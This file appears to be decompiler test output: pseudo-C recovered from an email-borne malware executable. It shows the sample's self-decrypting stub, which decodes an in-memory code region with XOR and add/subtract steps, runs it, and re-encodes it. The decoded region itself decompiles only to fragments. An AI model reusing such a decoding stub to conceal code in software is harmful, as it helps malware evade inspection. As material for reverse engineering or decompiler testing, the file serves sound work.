// subject.c
// Generated on 5/4/2015 12:14:04 AM by decompiling malware_via_email/malware_0030/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 * esi, word32 * edi, byte bl, byte bh)
{
	fn00401078(0x00401128, 0x0000062E);
	fn00401128(esi, edi, bl, bh);
	fn00401078(0x00401128, 0x0000062E);
	if (false)
	{
		fp->tFFFFFFE8.u0 = 0x00405000;
		fp->tFFFFFFE8.u0 = 0x00401000;
		lstrcpyA(fp->tFFFFFFE8, fp->tFFFFFFE8);
	}
	return;
}

void fn00401078(word32 dwArg04, word32 dwArg08)
{
	Eq_44 * dwLoc08_24 = null;
	while (dwLoc08_24 < dwArg08)
	{
		if (dwLoc08_24 > &globals->t0001 && (dwLoc08_24 - 0x00000001 & 0x00000001) == 0x00000000)
		{
			word32 eax_109 = dwLoc08_24 + dwArg04;
			Mem116[dwArg04 + dwLoc08_24:byte] = (byte) (DPB(eax_109, *eax_109, 0, 8) ^ 0x00000043);
		}
		if (dwLoc08_24 > &globals->t0001)
		{
			word32 eax_92 = dwLoc08_24 + dwArg04;
			Mem98[dwArg04 + dwLoc08_24:byte] = (byte) (DPB(eax_92, *eax_92, 0, 8) + 0x00000079);
		}
		if (dwLoc08_24 > &globals->t0003)
		{
			int32 edx_65 = dwLoc08_24 - 0x00000003;
			if (SEQ(edx_65 >> 0x0000001F, edx_65) % 0x00000003 == 0x00000000)
			{
				word32 eax_81 = dwLoc08_24 + dwArg04;
				Mem87[dwArg04 + dwLoc08_24:byte] = (byte) (DPB(eax_81, *eax_81, 0, 8) - 0x00000004);
			}
		}
		Mem59[dwArg04 + dwLoc08_24:byte] = Mem0[dwLoc08_24 + dwArg04:byte] - (byte) dwLoc08_24;
		dwLoc08_24 = dwLoc08_24 + 0x00000001;
	}
	return;
}

void fn00401128(word32 * esi, word32 * edi, byte bl, byte bh)
{
fn00401128_entry:
l00401128:
	branch CZ l00401185
l0040112E:
l00401185:
	*edi = *esi;
	__inb(0xA6)
l004011B2:
fn00401128_exit:
}

